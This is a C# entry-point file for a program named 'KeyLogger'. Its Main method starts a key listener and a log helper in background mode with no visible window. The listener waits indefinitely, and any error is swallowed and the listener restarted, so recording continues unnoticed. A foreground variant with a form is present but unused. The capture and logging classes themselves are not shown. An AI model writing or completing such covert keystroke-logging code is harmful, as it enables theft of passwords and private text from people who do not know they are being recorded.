using System;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            BackgroundListen();
        }

        static void ForegroundListen()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            FormHome homeForm = null;

            using (var listener = new KeyListener())
            {
                homeForm = new FormHome(listener);
                Application.Run(homeForm);
            }
        }

        static void BackgroundListen()
        {
            bool errorOccurred;
            do
            {
                errorOccurred = false;

                try
                {
                    using (var listener = new KeyListener())
                    using (var helper = new LogListenerHelper(listener))
                    {
                        // Keep application running indefinitely
                        new ManualResetEventSlim().Wait();
                    }
                }
                catch
                {
                    Thread.Sleep(500);
                    errorOccurred = true;
                }
            } while (errorOccurred);
        }
    }
}
